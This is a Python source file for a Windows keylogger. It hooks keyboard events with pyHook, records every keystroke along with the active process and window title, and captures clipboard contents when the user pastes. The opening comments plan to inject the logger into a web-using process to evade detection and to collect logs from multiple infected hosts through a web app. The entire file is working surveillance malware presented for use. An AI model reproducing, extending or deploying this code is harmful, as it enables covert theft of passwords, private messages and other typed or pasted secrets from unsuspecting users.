#keylogger
#ideas for improvement: write to file instead of console, inject keylogger into process, maybe a web interface. Although that would make it easier to detect unless injected into process that uses the web regularly, 
#Have web app setup to show logged data for each host running the keylogger

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

#gets us handles to the current process, must hook into process to have a keylogger
def get_current_process():

	#get a handle to the foreground window
	hwnd = user32.GetForegroundWindow()

	#find the process ID
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))

	#store the current process ID
	process_id = "%d" % pid.value

	#grab the executable
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

	#new read its title
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title),512)

	#print out the header if we're in the right process
	print
	print "[PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
	print

	#close handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

def KeyStroke(event):
	global current_window

	#check to see if target changed windows
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process()

	#if they pressed a standard key
	if event.Ascii > 32 and event.Ascii < 127:
		print chr(event.Ascii)
	else:
		#if ctrl-v get value of clipboard
		if event.Key == "V":

			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			print "[PASTE] - %s" % (pasted_value)
		else:
			print "[%s]" % event.Key

	#pass execution to next hook registered
	return True

kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

#register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()